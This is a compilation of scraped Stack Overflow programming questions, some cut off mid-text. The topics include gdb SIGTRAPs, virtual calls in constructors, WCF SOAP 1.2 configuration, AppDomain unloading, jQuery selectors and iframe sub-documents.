@TITLE:What causes a Sigtrap in a Debug Session
@CONTENT:In my c++ program I'm using a library which will "send?" a Sigtrap on a certain operations when I'm dubugging it ( using gdb as debugger). I can then choose weather I wish to Continue or Stop the program. If I choose to continue the program works as expected but setting custum breakpoints, after a Sigtrap has been caught, causes the debugger / program to crash.... So here my questions: What causes such a Sigtrap? Is it a leftover line of code that can be removed, or is it caused by the debugger when he "finds something he doesn't like" ? Is a sigtrap, generally speaking, a bad thing, and if so: Why does the program run flawless when I compile a Release and not a Debug Version. What does a Sigtrap indicate? This is a more general aproach to a question I posted yesterday http://stackoverflow.com/questions/3469463/boost-filesystem-recursive-directory-iterator-constructor-causes-sigtraps-and-de. I think my question was far to specific, and I don't want you to solve my problem but help me (and hopefully others) to understand the background.... Thanks a lot

@TITLE:Calling an overridden method from a parent class ctor
@CONTENT:I tried calling an overridden method from a constructor of a parent class and noticed different behavior across languages. C++ - echoes A.foo() class A{

public: 

    A(){foo();}

    virtual void foo(){cout<<"A.foo()";}
};

class B : public A{

public:

    B(){}

    void foo(){cout<<"B.foo()";}
};

int main(){

    B *b = new B(); 
}
 Java - echoes B.foo() class A{

    public A(){foo();}

    public void foo(){System.out.println("A.foo()");}
}

class B extends A{  

    public void foo(){System.out.println("B.foo()");}
}

class Demo{

    public static void main(String args[]){
        B b = new B();
    }
}
 C# - echoes B.foo() class A{

    public A(){foo();}

    public virtual void foo(){Console.WriteLine("A.foo()");}
}

class B : A{    

    public override void foo(){Console.WriteLine("B.foo()");}
}


class MainClass
{
    public static void Main (string[] args)
    {
        B b = new B();              
    }
}
 I realize that in C++ objects are created from top-most parent going down the hierarchy, so when the constructor calls the overridden method, B does not even exist, so it calls the A' version of the method. However, I am not sure why I am getting different behavior in Java and C# (from C++)
@CODE:C++ A.foo() class A{

public: 

    A(){foo();}

    virtual void foo(){cout<<"A.foo()";}
};

class B : public A{

public:

    B(){}

    void foo(){cout<<"B.foo()";}
};

int main(){

    B *b = new B(); 
} Java B.foo() class A{

    public A(){foo();}

    public void foo(){System.out.println("A.foo()");}
}

class B extends A{  

    public void foo(){System.out.println("B.foo()");}
}

class Demo{

    public static void main(String args[]){
        B b = new B();
    }
} C# B.foo() class A{

    public A(){foo();}

@TITLE:How do I configure NetBeans to only step through Java code that I've written
@CONTENT:Am I missing something? I'm delighted that all that code is there showing how the generic collections work etc. However when I want to simply walk my code I'm forever finding myself going deeper into Java's own library code than I care to. Is it possible to simply disable that when stepping code - I want to treat all of that stuff as a Black Box, code stepping is just for stuff I've written. And you know what, now I've got that capability, is it possible to wrap up my own code that way too so that I can step just the bits I'm most interested in? And if i can't easily in netbeans, is it possible in eclipse? thanks

@TITLE:Can I have a variable number of generic parameters?
@CONTENT:In my project I have the following three interfaces, which are implemented by classes that manage merging of a variety of business objects that have different structures. public interface IMerger<TSource, TDestination>
{
    TDestination Merge(TSource source, TDestination destination);
}

public interface ITwoWayMerger<TSource1, TSource2, TDestination>

    TDestination Merge(TSource1 source1, TSource2 source2, TSource3 source3, TDestination destination);

 This works well, but I would rather have one IMerger interface which specifies a variable number of TSource parameters, something like this (example below uses params; I know this is not valid C#): public interface IMerger<params TSources, TDestination>
{
    TDestination Merge(params TSource sources, TDestination destination);
}
 It there any way to achieve this, or something functionally equivalent?

@TITLE:How to change a Visual Studio project type?
@CONTENT:I finally figured out that Visual Studio keeps track of how you create a project (in other words which project template you select initially) and filters your options later based on that initial decision. The information is kept in the *.csproj file as a <ProjectTypeGuids> element. Other than just editing the *.csproj file, is there a "right" way to change a project type for an existing project? Considering the significance of that setting it seems likely there's a place in the GUI to change it, but I couldn't find one. Thanks!

Someone else has asked the question before but, huh? http://www.pcreview.co.uk/forums/thread-1385785.php The guy answering said Basically, it means that you can rely on StreamReader.ReadBlock not returning until either it's read as much as you've asked it to, or it's reached the end of the stream. Am I understanding correctly that this is required because Read may not give you everything you asked for? And that just because it returns 0 does NOT mean you reached the end of the file? So this means check something other than the number of bytes returned (EndOfStream?) or use ReadBlock instead?

@LINK:/questions/22732226/where-do-i-find-the-java-jdk-source-code-for-jdk-1-8
@TITLE:Where do I find the Java JDK Source code for JDK 1.8?
@CONTENT:I have already seen the question Where to find Java JDK Source Code?, and it isn't helping me. I am trying to get the Oracle Java source code for JDK 1.8. It has been suggested that this question is off-topic. Please see the edit at the end of this question regarding this. According to Oracle's readme, once installed it should come with the source code, conveniently placed in the JDK directory and named src.zip. [Ref: http://www.oracle.com/technetwork/java/javase/jdk-8-readme-2095712.html#contents ]. I have tried installing both the JDK 1.8 on its own as well as with Netbeans, and neither seems to have provided me with the required zip. I've run a recursive search. I've used 7zip to search the executable installers. No dice. Here is what my JDK directory looks like. Note that I have manually added the docs (my network is sometimes slow):  Volume in drive C is Vista
 Volume Serial Number is 5057-B08E

 The javafx-src.zip is included, and certainly contains the source for javafx. When I ran the new Netbeans, it found my new jre and javac and also the source for my javafx, but it didn't find the mysterious missing src.zip. Since I seem to be the first asking this question (at least regarding jdk1.8) I feel like I must be missing something obvious. I don't want to use the OpenJDK source [ Where can I find the JDK 8/JavaFX 8 source code? ] (it does differ from the Oracle source). I can't find a separate file to download from Oracle, and I've spent an embarrassing amount of time on this. Any help is appreciated, and thanks in advance. EDIT Thanks to RC for helping me solve this. I cannot confirm or deny that my country has anything to do with it, but if it helps, I'm in Australia and not using any proxy. I tried the standard Oracle site [ http://www.oracle.com/technetwork/java/javase/downloads/index.html ] as well as the snap-shot site [ https://jdk8.java.net/download.html ]. Here is what I tried and didn't work:  - Windows 32 bit zip (Standard Oracle site)
 - Windows 64 bit zip (Standard Oracle site)
 - Windows 32 bit zip (Oracle snap-shot site)
 - Windows 32 bit zip (Standard Oracle site, selecting country as "Australia")
 - Windows 32 bit zip (Standard Oracle site, selecting country as "USA")
 - Windows 32 bit zip (Standard Oracle site, after logging in)
 Here is what did work:  - Linux 32 bit tar.gz (Standard Oracle site)
 - Linux 32 bit tar.gz (Oracle snap-shot site)
 EDIT It has been suggested that this question is off-topic because it asks to recommend or find a book, tool, software library, tutorial or other off-site resource. These questions are off-topic for Stack Overflow as they tend to attract opinionated answers and spam. I would argue that this is not the case here. This is not asking for the "best book on Java programming" or the like; it is pointing out a significant part of a tool used solely for programming is missing in the official resource and asking where that one specific part can be located. While there may be multiple answers, this cannot really lead to opinionated answers ("you should use this source not that source") as there is only one source. It should not lead to spam ("use my Oracle Java source") again for the same reason. It is true that this is not the kind of question accompanied by code. However, I feel that the JDK (essentially java) is a software tool commonly used by programmers, and that this problem is both a problem relevant specifically to programmers, is practical and is answerable (and indeed has been answered), and is unique to software development. Furthermore, while not conclusive, I think it is fair to note that the question has been up for some time, has received a lot of traffic, and no opinionated answers or spam to date. The question is less relevant now that this refers to an old version of the JDK, but for those (like me) who have to maintain old projects for systems that run old JREs, it can still be useful.

@CONTENT:I'm trying to create an accordion using Bootstrap 3 using the button collapsible with the data attribute, without the accordion markup. It just looks more cleaner to me. However I cannot make the data-parent attribute to work. I want when opening a question, all others to close. I'm reading the docs ( http://getbootstrap.com/javascript/#collapse-usage ) but still cannot get it to work. I'm using the following code: <div class="accordion" id="myAccordion">

    <div id="collapsible-1" class="collapse">

    </div>
    <button type="button" class="btn btn-danger" data-toggle="collapse" data-target="#collapsible-2" data-parent="#myAccordion">Question 2?</button>

It runs some code in a background thread itself, and then uses dispatch_get_main_queue when it returns a value to it's block argument. I don't want it to force it onto the main queue if it wasn't when it entered the method. Is there a way to get a pointer to the current dispatch queue?

@TITLE:Is it OK to use a string as a lock object?
@CONTENT:I need to make a critical section in an area on the basis of a finite set of strings. I want the lock to be shared for the same string instance, (somewhat similar to String.Intern approach). I am considering the following implementation: public class Foo
{
    private readonly string _s;
    private static readonly HashSet<string> _locks = new HashSet<string>();

    public Foo(string s)
    {
        _s = s;
        _locks.Add(s);
    }

    public void LockMethod()
    {
        lock(_locks.Single(l => l == _s))
        {
            ...
        }
    }
}
 Are there any problems with this approach? Is it OK to lock on a string object in this way, and are there any thread safety issues in using the HashSet<string>? Is it better to, for example, create a Dictionary<string, object> that creates a new lock object for each string instance? Final Implementation Based on the suggestions I went with the following implementation: public class Foo
{
    private readonly string _s;
    private static readonly ConcurrentDictionary<string, object> _locks = new ConcurrentDictionary<string, object>();

    public Foo(string s)
    {
        _s = s;
    }

    public void LockMethod()
    {
        lock(_locks.GetOrAdd(_s, new object()))
        {
            ...
        }
    }
}

    }

First random double generated based on the seed : I searched for information about this, but I didn't see anything referring to this precise problem. I know that there is many issues with LCGs algorithms, but I didn't know about this one, and I was wondering if this was a known issue. And also, do you know if this problem only for the first value (or first few values), or if it is more general and using close seeds should be avoided? Thanks.

@TITLE:Random floating point double in Inclusive Range
@CONTENT:We can easily get random floating point numbers within a desired range [X,Y) (note that X is inclusive and Y is exclusive) with the function listed below since Math.random() (and most pseudorandom number generators, AFAIK) produce numbers in [0,1): function randomInRange(min, max) {
  return Math.random() * (max-min) + min;
}
// Notice that we can get "min" exactly but never "max".
 How can we get a random number in a desired range inclusive to both bounds, i.e. [X,Y]? I suppose we could "increment" our value from Math.random() (or equivalent) by "rolling" the bits of an IEE-754 floating point double precision to put the maximum possible value at 1.0 exactly but that seems like a pain to get right, especially in languages poorly suited for bit manipulation. Is there an easier way? (As an aside, why do random number generators produce numbers in [0,1) instead of [0,1]?) [Edit] Please note that I have no need for this and I am fully aware that the distinction is pedantic. Just being curious and hoping for some interesting answers. Feel free to vote to close if this question is inappropriate.

My current PYTHONPATH is set to PYTHONHOME. Should I also add the directories from sys.path? UPDATE: Based on the below information, PYTHONPATH does not need to be set unless there are non-standard libraries that you want python to be able to find by default. For instance, when I install wxPython from the installer it will add its libraries to PYTHONPATH. I do set PYTHONHOME to the root of the python installation so that I can add it to my system PATH environment variable so that I can run python from any where.

@CONTENT:I have computer with Windows XP and no Internet connection, only access to network drive. I'd like to set up a git repository on the network drive and then push to it from my local repository, so I can at the end of the day go to a computer with Internet connection and push from network drive to github. My problem is I cannot access network drive from git. I put PortableGit on the network drive, but git-bash.bat and git-cmd.bat die with "CMD does not support UNC paths as current directories.". I tried replacing "cd" with "pushd" in git-cmd.bat, but it doesn't work. BTW, I use PortableGit since I don't have admin permissions on my machine. Any ideas?

@CONTENT:I have started to build my own apps on iPhone and iPad using the iPhone SDK. The next question that is always asked by the client is, "Can we have it on Android?" So my question to you, 'the internet', is: what are my options? I don't have the time to learn another language (learning iOS has been enough!), so are there companies who specialize in this, or are there any online services that do a conversion?

@LINK:/questions/4432141/how-to-properly-unload-an-appdomain-using-c
@TITLE:How to properly unload an AppDomain using C#?
@CONTENT:I have an application that loads external assemblies which I have no control over (similar to a plugin model where other people create and develop assemblies that are used by the main application). It loads them by creating new AppDomains for these assemblies and then when the assemblies are done being used, the main AppDomain unloads them. Currently, it simplistically unloads these assemblies by try
{
    AppDomain.Unload(otherAssemblyDomain);
}
catch(Exception exception)
{
    // log exception
}
 However, on occasion, exceptions are thrown during the unloading process specifically CannotUnloadAppDomainException. From what I understand, this can be expected since a thread in the children AppDomains cannot be forcibly aborted due to situations where unmanaged code is still being executed or the thread is in a finally block: When a thread calls Unload, the target domain is marked for unloading. The dedicated thread attempts to unload the domain, and all threads in the domain are aborted. If a thread does not abort, for example because it is executing unmanaged code, or because it is executing a finally block, then after a period of time a CannotUnloadAppDomainException is thrown in the thread that originally called Unload. If the thread that could not be aborted eventually ends, the target domain is not unloaded. Thus, in the .NET Framework version 2.0 domain is not guaranteed to unload, because it might not be possible to terminate executing threads. My concern is that if the assembly is not loaded, then it could cause a memory leak. A potential solution would be to kill the main application process itself if the above exception occurs but I rather avoid this drastic action. I was also considering repeating the unloading call for a few additional attempts. Perhaps a constrained loop like this: try
{
    AppDomain.Unload(otherAssemblyDomain);
}
catch (CannotUnloadAppDomainException exception)
{
    // log exception
    var i = 0;
    while (i < 3)   // quit after three tries
    {
        Thread.Sleep(3000);     // wait a few secs before trying again...
        try
        {
            AppDomain.Unload(otherAssemblyDomain);
        }
        catch (Exception)
        {
            // log exception
            i++;
            continue;
        }
        break;
    }
}
 Does this make sense? Should I even bother with trying to unload again? Should I just try it once and move on? Is there something else I should do? Also, is there anything that can be done from the main AppDomain to control the external assembly if threads are still running (keep in mind others are writing and running this external code)? I'm trying understand what are best practices when managing multiple AppDomains.
@CODE:try
{
    AppDomain.Unload(otherAssemblyDomain);
}
catch(Exception exception)
{
    // log exception
} CannotUnloadAppDomainException finally try
{
    AppDomain.Unload(otherAssemblyDomain);
}
catch (CannotUnloadAppDomainException exception)
{
    // log exception
    var i = 0;
    while (i < 3)   // quit after three tries
    {
        Thread.Sleep(3000);     // wait a few secs before trying again...
        try
        {
            AppDomain.Unload(otherAssemblyDomain);
        }
        catch (Exception)
        {
            // log exception
            i++;
            continue;
        }

@TITLE:Iterate over a string 2 (or n) characters at a time in Python
@CONTENT:Earlier today I needed to iterate over a string 2 characters at a time for parsing a string formatted like "+c-R+D-E" (there are a few extra letters). I ended up with this, which works, but it looks ugly. I ended up commenting what it was doing because it felt non-obvious. It almost seems pythonic, but not quite. # Might not be exact, but you get the idea, use the step
# parameter of range() and slicing to grab 2 chars at a time
s = "+c-R+D-e"
for op, code in (s[i:i+2] for i in range(0, len(s), 2)):
  print op, code
 Are there some better/cleaner ways to do this?

@LINK:/questions/1158410/how-to-handle-incorrect-values-in-a-constructor
@TITLE:How to handle incorrect values in a constructor?
@CONTENT:Please note that this is asking a question about constructors, not about classes which handle time. Suppose I have a class like this: class Time
{
protected:
    unsigned int m_hour;
    unsigned int m_minute;
    unsigned int m_second;
public:
    Time(unsigned int hour, unsigned int minute, unsigned int second);
};
 While I would want a to be constructed successfully, I would want the constructor of b to fail. Time a = Time(12,34,56);
Time b = Time(12,34,65); // second is larger than 60
 However, this is not possible, because constructors do not return any values and will always succeed. How would the constructor tell the program that it is not happy? I have thought of a few methods: have the constructor throw an exception, and have handlers in the calling function to handle it. have a flag in the class and set it to true only if the values are acceptable by the constructor, and have the program check the flag immediately after construction. have a separate (probably static) function to call to check the input parameters immediately before calling the constructor. redesign the class so that it can be constructed from any input parameters. Which of these methods is most common in industry? Or is there anything I may have missed?
@CODE:class Time
{
protected:
    unsigned int m_hour;
    unsigned int m_minute;
    unsigned int m_second;
public:
    Time(unsigned int hour, unsigned int minute, unsigned int second);
}; Time a = Time(12,34,56);
Time b = Time(12,34,65); // second is larger than 60

@TITLE:Why is the id of a Python class not unique when called quickly?
@CONTENT:I'm doing some things in python (Using python 3.3.3), and I came across something that is confusing me since to my understanding class's get a new id each time they are called. Lets say you have this in some .py file:  class someClass: pass

 print(someClass())
 print(someClass())
 The above returns the same id which is confusing me since I'm calling on it so it shouldn't be the same, right? Is this how python works when the same class is called twice in a row or not? It gives a different id when I wait a few seconds but if I do it at the same like the example above it doesn't seem to work that way, which is confusing me.  >>> print(someClass());print(someClass())
 <__main__.someClass object at 0x0000000002D96F98>
 <__main__.someClass object at 0x0000000002D96F98>
 It returns the same thing, but why? I also notice it with ranges for example for i in range(10):
    print(someClass())
 Is there any particular reason for python doing this when the class is called quickly? I didn't even know python did this, or is it possibly a bug? If it is not a bug can someone explain to me how to fix it or a method so it generates a different id each time the method/class is called? I'm pretty puzzled on how that is doing it because if I wait, it does change but not if I try to call the same class two or more times.
@CODE:class someClass: pass

 print(someClass())
 print(someClass()) >>> print(someClass());print(someClass())

@TITLE:What do you need to pass to v4.widget.DrawerLayout.isDrawerOpen()/.openDrawer()/.closeDrawer()
@CONTENT:I've been trying to move my code across to the DrawerLayout as suggested by android here as SlidingDrawer is deprecated. My problem is that so far DrawerLayout seems to be either very badly implemented, has unhelpful error messages (no defensive programming) and/or isn't explained well enough in the documentation. the isDrawerOpen() method is described here: public boolean isDrawerOpen (View drawer) Check if the given drawer view is currently in an open state. To be considered "open" the drawer must have settled into its fully visible state. To check for partial visibility use isDrawerVisible(android.view.View). Parameters: drawer - Drawer view to check Returns: true if the given drawer view is in an open state Each of the methods isDrawerOpen(View drawer), openDrawer(View drawer) and closeDrawer(View drawer) don't work when passed: The DrawerLayout in question or either of it's children. I have no idea what I'm supposed to feed into these methods to allow them to function. Can someone let me know? See below for entire problem description with implementation. I have a layout like so: <android.support.v4.widget.DrawerLayout
    android:id="@+id/mainmenuPanel"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <FrameLayout
        android:id="@+id/dualPane"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

    <FrameLayout
        android:id="@+id/menuPane"
        android:layout_width="300dp"
        android:layout_height="match_parent" />
</android.support.v4.widget.DrawerLayout>
 And in my code I have the following method hooked up to a button: protected void onCreate(Bundle savedInstanceState) {    
    ...
    mMenuPanel = (DrawerLayout) findViewById(R.id.mainmenuPanel);
    ....
}

public boolean isDrawerOpen() {
    if(mMenuPanel != null) {
        return mMenuPanel.isDrawerOpen(mMenuPanel);
    }
    return false;
}
 However if you give it itself as an argument (which would be redundant in the extreme) you get the following error: E/AndroidRuntime(11241): java.lang.ClassCastException: 
android.widget.FrameLayout$LayoutParams cannot be cast to 
android.support.v4.widget.DrawerLayout$LayoutParams
 (Which as you'll notice, doesn't give you any information about what you did wrong. It is instead a symtom of the problem). Other answers here or here are either incomprehensible or very closely tied to the question without much explanation. Even so I've tried adding a faux LinearLayout or one the DrawerLayouts children and each give this error: E/AndroidRuntime(11424): java.lang.IllegalArgumentException:

@TITLE:How to add tooltips to chart.js graph
@CONTENT:I'm working on a webapp and I recently swapped google charts with chart.js because it is visually more appealing. However, the one loss that I took is that I can no longer get tooltips above the data points. I was wondering if anyone knows how this can be done as I am a novice with javascript. Here is the code for the graph and the settings:     var data = {
            labels : graphData[0],
            datasets : [
                {
                    fillColor : "rgba(200,160,100,0.5)",
                    strokeColor : "rgba(80,240,70,1)",
                    pointColor : "rgba(80,240,70,1)",
                    pointStrokeColor : "#fff",
                    data : graphData[3]
                },
                {
                    fillColor : "rgba(220,220,220,0.5)",
                    strokeColor : "rgba(220,220,220,1)",
                    pointColor : "rgba(220,220,220,1)",
                    pointStrokeColor : "#fff",
                    data : graphData[1]
                },
                {

@TITLE:How are users supposed to persist settings in a Windows Phone 8 app?
@CONTENT:I'm in the process of writing a Windows Phone 8 app, so I can capture that much sought-after 3% market share, and am having a hard time persisting user settings within the application. I first ran across this blog which goes over the basics of the Windows.Storage namespace, which is intended to do exactly this sort of thing. Yay! However, I guess the author never actually ran his own code, as otherwise he would know that the second you call ApplicationData.Current.LocalSettings, you'd get a NotImplementedException exception. To the MSDNs we go! Well, this makes it pretty clear that this API is not implemented on Windows Phone 8. I came to this conclusion when it said, "This API is not implemented and will throw an exception if called." - Well that's great. So, maybe there's some other similar APIs. After a bit more Googling, I came across this blog. It's called "Windows 8 Apps - Must Know Tricks!". This looks official! It goes over all sorts of really cool looking persistence APIs, including permanent and transient storage, roaming storage, etc. But guess what: RoamingFolder, RoamingSettings, TemporaryFolder, LocalSettings - None of it is implemented on Windows Phone 8. Did implementing these somewhat-key features just slip their mind? Am I supposed to create a local SQL database to store basic app settings, or is there something simple I'm not finding?

@TITLE:WCF SOAP 1.2 service expecting SOAP 1.1 content type
@CONTENT:I'm building a WCF web service that requires interop with non-WCF clients (in fact, there will be no WCF clients). I've already written a WSDL using SOAP 1.2 (as per this example). I've validated the WSDL and have used this file (not the WSDL generated by WCF, which is superficially different) to create a soapUI test project. I have a requirement that the web service will support SOAP 1.2, so I can't just fall back to SOAP 1.1 (which worked just fine in an early prototype). I've used WSCF.blue to generate my WCF service, interface, and data contract classes. Everything compiles nicely and the endpoint is exposed if I hit the WCF service in my browser. All seems well with the world. When I try to call a method from soapUi I get the following response from the server (as visible from soapUI): HTTP/1.1 415 Cannot process the message because the content type 
'application/soap+xml;charset=UTF-8;action="http://tempuri.org/FetchMyThing"' 
was not the expected type 'text/xml; charset=utf-8'.
Server: Microsoft-IIS/7.5
X-Powered-By: ASP.NET
Date: Mon, 30 Apr 2012 08:15:29 GMT
Content-Length: 0
 (Actual method names and namespaces have been manually changed for the purposes of this question. Any typos in namespace are not errors in my code - just an oversight in typing up this question) I know that SOAP 1.1 specifies that the content type must be text/xml. SOAP 1.2 requires application/soap+xml. My raw request (as per soapUI): POST http://localhost/MyWs.svc HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/FetchMyThing"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:ns="http://tempuri.org">

   <soap:Body>
      <ns:fetchMyThingRequest attribute1="1" attribute2="10">
      </ns:fetchMyThingRequest>
   </soap:Body>
</soap:Envelope>
 From this response, it tells me that my request is properly formed - it's a SOAP 1.2 request with the correct content type. My WCF service, however, does not expect this content type, which I assume means I have not configured it correctly and it still thinks it's a SOAP 1.1 web service. Minimal Web.config, as per this blog post: <system.serviceModel>
  <services>
    <service name="MyNamespace.MyPort">
      <endpoint address="" binding="customBinding" bindingConfiguration="httpSoap12" contract="IWsPort12" />
    </service>
  </services>

  <bindings>
    <customBinding>
      <binding name="httpSoap12">
        <textMessageEncoding messageVersion="Soap12" />
        <httpTransport />
      </binding>
    </customBinding>
  </bindings>
</system.serviceModel>
 A snippet of the service contract: [ServiceContract(Namespace = "http://tempuri.org")]
public interface IWsPort
{
  [OperationContract(Action = "http://tempuri.org/FetchMyThing")]
  [FaultContract(typeof(WsFault), Action = "http://tempuri.org/FetchMyThing", Name = "fetchMyThingFault")]
  [XmlSerializerFormat(SupportFaults = true)]
  FetchMyThingResponse FetchMyThing(FetchMyThingRequest request);
}
 I enabled service tracing for my WCF service and see the following exception that seems to confirm my hypothesis: Activity: Listen at 'http://mycomputer/MyWs.svc
<Exception>
  <ExceptionType>System.ServiceModel.ProtocolException, System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</ExceptionType>

 So, my contract and service bindings are probably mismatched, if this message is to believed, but from what I understand of WCF my configuration (or at least the intent behind it) is correct. Does anyone have any ideas as to what's wrong with my configuration?

@TITLE:Why would one use #include_next in a project?
@CONTENT:To quote the iOS Documentation on Wrapper Headers: #include_next does not distinguish between <file> and "file" inclusion, nor does it check that the file you specify has the same name as the current file. It simply looks for the file named, starting with the directory in the search path after the one where the current file was found. The use of `#include_next' can lead to great confusion. We recommend it be used only when there is no other alternative. In particular, it should not be used in the headers belonging to a specific program; it should be used only to make global corrections along the lines of fixincludes. So, two questions, what is #include_next, and why would you ever need to use it?

 I'm trying to add padding around the WebView, as at the moment the text runs right up to the edge of the UI. I tried adding android:padding="8dp" to the WebView, but no padding was added. I also tried paddingLeft and paddingRight too, but they didn't work either. The WebView API docs confirm it inherits from View, which supports the android:padding attribute, so I'm surprised this didn't work. Does anybody know if this is a known issue, or some interaction of my layout XML that I'm not understanding? FYI, my workaround was to put an extra LinearLayout around the WebView, and add the padding to that instead:   <LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="0dp"
    android:layout_weight="1.0"

for k, v in dict_.items():
  if condition(k, v):
    remove.append(k)
    continue
  # do other things you need to do in this loop
for k in remove:
  del dict_[k]
 The only overhead here is building the list of keys to remove; unless it grows large compared to the dictionary size, it's not an issue. However, this approach requires some extra coding, so it's not very popular. The popular dict comprehension approach: dict_ = {k : v for k, v in dict_ if not condition(k, v)}
for k, v in dict_.items():
  # do other things you need to do in this loop
 results in a full dictionary copy, and so has the risk of a silly performance hit if dictionaries grow large or the containing function is called often. A much better approach is to copy the keys only rather than whole dictionary: for k in list(dict_.keys()):
  if condition(k, dict_[k]):
    del dict_[k]
    continue
  # do other things you need to do in this loop       
 (Note that all code examples are in Python 3, so keys(), items() returns a view, not a copy.) In most cases, it won't hurt performance that much, since the time to check even the simplest condition (not to mention other stuff you're doing in the loop) is usually greater than the time to add one key to a list. Still, I am wondering if it's possible to avoid even that with a custom dictionary that allows deletions while iterating: for k, v in dict_.items():
  if condition(k, v):
    del dict_[k]
    continue
  # do other things you need to do in this loop
 Perhaps an iterator could always look ahead, so that when the __next__ is called, the iterator knows where to go without even looking at the current element (it would only need to look at the element when it first gets to it). And if there is no next element, the iterator could just set the flag that would cause StopIteration exception raised whenever __next__ is called again. If the element the iterator tries to advance to turns out to be deleted, it's fine to raise an exception; there is no need to support deletions while multiple iterations are going on simultaneously. Are there any problems with this approach? One problem is that I'm not sure it can be done with no material overhead compared to the existing dict; otherwise, it would be faster to use the list(dict_) approach! UPDATE: I tried all the versions. I don't report the timing, since they are clearly very dependent on the exact situation. But it seems safe to say that in many cases, the fastest approach is likely to be list(dict_). After all, if you think about, the copy is the fastest operation that grows linearly with size of the list; almost any other overhead, as long as it's also proportional to the list size, is likely to be bigger. I really like all the ideas, but since I have to select only one, I'm accepting the context manager solution since it allows to use the dictionary as either normal or "enhanced" with very small code changes.
@CODE:remove = []
for k, v in dict_.items():
  if condition(k, v):
    remove.append(k)
    continue
  # do other things you need to do in this loop
for k in remove:
  del dict_[k] dict_ = {k : v for k, v in dict_ if not condition(k, v)}
for k, v in dict_.items():
  # do other things you need to do in this loop for k in list(dict_.keys()):
  if condition(k, dict_[k]):
    del dict_[k]
    continue
  # do other things you need to do in this loop keys() items() for k, v in dict_.items():
  if condition(k, v):
    del dict_[k]
    continue
  # do other things you need to do in this loop __next__ StopIteration __next__ dict list(dict_) list(dict_)

@TITLE:Relative URLs and trailing slashes
@CONTENT:I've looked around the web for this before, and I suspect the answer is "you can't", but since I've not yet found an answer which is that definitive, I think it's worth asking here. The closest I've found touching on the problem is The mystery of the trailing slash and the relative url (which is currently down, but Google has a text-only cached version). Because of the traditional design of URLs with a trailing slash being interpreted as a directory and those without a trailing slash being interpreted as a file resource, and relative URLs working off the directory, then if the current page has a path of /lorem/ipsum/dolor
 a relative path of not-dolor
 will resolve as /lorem/ipsum/not-dolor
 which naturally makes sense, when /lorem/ipsum/dolor is viewed as a file resource, dolor, sitting in a directory, /lorem/ipsum/; typical, intuitive conventions. However, since a significant number of websites are now dynamic applications without a filesystem mapping for each URL, this can cause headaches, because sometimes you really want to work relative to the path as though, in the current design, there were a trailing slash. Is there any reasonable way ("not involving server-side processing/variables/other, or JavaScript") of using a relative path based off the current path, and not the "directory" of the current path? So that not-dolor could be relative to /lorem/ipsum/dolor and produce /lorem/ipsum/dolor/not-dolor
 There is no workaround that I know of involving something like ./not-dolor, since . is still (/lorem/)ipsum/. Short of redirecting to a trailing slash and making sure that all resources have URLs which correspond to a directory-ish and a file-ish nature, or modifying the spec(!), is there any way of tackling this?
@CODE:/lorem/ipsum/dolor not-dolor /lorem/ipsum/not-dolor /lorem/ipsum/dolor dolor /lorem/ipsum/ not-dolor /lorem/ipsum/dolor /lorem/ipsum/dolor/not-dolor ./not-dolor . (/lorem/)ipsum/

@TITLE:jQuery select descendants, including the parent
@CONTENT:Consider the following HTML: <div class="foo" id="obj">
   I should be changed red
   <div class="bar" style="color:black;">
      I should not be changed red.
      <div class="foo">I should be changed red.</div>
   </div>
</div>
 Given a DOM element obj and an expression, how do I go about selecting any children and possibly obj? I'm looking for something similar to "select descendants" but also including the parent, if it matches the expression. var obj = $("#obj")[0];

//wrong, may include siblings of 'obj'
$(".foo", $(obj).parent()).css("color", "red");

//wrong -- excludes 'obj'
$(".foo", obj).css("color", "red");

//correct way, but it's annoying
var matches = $(".foo", obj);
if ($(obj).is(".foo")) matches = matches.add(obj);
matches.css("color", "red");
 Is there a more elegant solution to this?
@CODE:<div class="foo" id="obj">
   I should be changed red
   <div class="bar" style="color:black;">
      I should not be changed red.
      <div class="foo">I should be changed red.</div>
   </div>
</div> obj obj var obj = $("#obj")[0];

//wrong, may include siblings of 'obj'
$(".foo", $(obj).parent()).css("color", "red");

//wrong -- excludes 'obj'
$(".foo", obj).css("color", "red");

//correct way, but it's annoying
var matches = $(".foo", obj);
if ($(obj).is(".foo")) matches = matches.add(obj);

@CONTENT:An abstract class can only be used as a base class which is extended by some other class, right? The constructor(s) of an abstract class can have the usual access modifiers (public, protected, and private (for internal use)). Which of protected and public is the correct access modifier to use, since the abstract type seems to indicate that technically a public constructor will act very much protected? Should I just use protected on all my constructors?

@TITLE:How to create a cross-browser sub document with iframe or shadow dom?
@CONTENT:I want to create a totally encapsulated sub-document in JavaScript, with its own <head>, <body>, styles, html, and js. Basically a shadow dom, or an iframe, but without an src attribute. Though I love the idea of shadow dom, its support is very low, and thus is not ready for prime time. So I have been working on creating an iframe, but have been hitting various road-blocks along the way. Here is a jsFiddle demonstrating my various attempts. The iframe cannot exist in the dom. This part is critical. To clarify, it is okay if it momentarily exists in the dom, but it must be able to be extracted and exist only in JS. $('body').append('<iframe id="iframeGenerator" />');
var iframe3 = $('#iframeGenerator');
var iframe3Contents = iframe3.contents();
$('#iframeGenerator').remove();
var head = iframe3.contents().find('head');
 sweet, we have the head console.log(head.length);
 but what do the contents look like? console.log(iframe3Contents.get(0));
 It is a document, but not inside of an element so lets try to put it in the dom or inside of another element? both of the following attempts dont work because the selector has no context or something ... $('body').append(iframe3Contents);
var generatedIframe = $('<iframe />').append(iframe3Contents);
 And here's where I turn to you for help :) I would love to be able to create the iframe / subdocuemnt without appending anything to the dom... but if i must, i would still like to be able to subsequently remove it from the dom and manage it further in js. I have this little function, which doesn't work, but illustrates the kind of iframe or subdocument generator i would like to create var iframeHtml;
giveMeIframe = function() {
  var iframeContents;
  if (iframeHtml) {
    return iframeHtml;
  } else {
    $('body').append('<iframe id="iframeGenerator" style="display: none" />');
    iframeContents = $('#iframeGenerator').contents();
    iframeHtml = $('<iframe />');
    iframeHtml.append(iframeContents);
    $('#iframeGenerator').remove();
    return iframeHtml;
  }
}
 Thanks a bunch y'all.

 But my worry is that the variable x contains fewer significant bits of 3.14159265358979323846264338328 than 64, because this is a double literal. Is this worry justified?

